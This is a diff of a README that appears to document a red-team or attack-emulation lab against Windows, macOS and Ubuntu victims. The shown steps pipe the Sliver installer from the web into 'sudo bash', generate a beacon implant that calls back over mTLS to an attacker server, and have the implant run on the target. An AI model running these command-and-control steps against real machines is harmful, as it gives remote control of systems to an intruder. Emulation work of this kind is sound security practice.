@@ -62,14 +62,19 @@ You can download form official website of Kali(https://www.kali.org/)
 Victims：a Windows 10, a macOS and an Ubuntu
 
 ### Execute the attack manually
-①Download the latest sliver server release for your platform, and just run the binary.
-```
+Each `UUID` encompasses an `executor`, within which the `command` parameter specifies the actual attack command that needs to be executed. You should proceed manually through the attack steps in the sequence of the UUIDs. 
+①Download the latest `Sliver` or `Metasploit` for your attack platform, and just run the binary.
+```bash
+# Sliver
 kali > curl https://sliver.sh/install|sudo bash
 kali > sliver
+# Metasploit
+
 ```
+
 ②Generate a beacon implant for the Windows platform and enable mTLS monitoring with the specified IP address.
 ```
-sliver > generate beacon --arch amd64 --os  windows --mtls <Server IP> --save .
+sliver > generate beacon --arch <target_architecture> --os  <target_os> --mtls <Server IP> --save .
 sliver > mtls
 ```
 ③Download the sliver implant manually and execute it on the target machine.
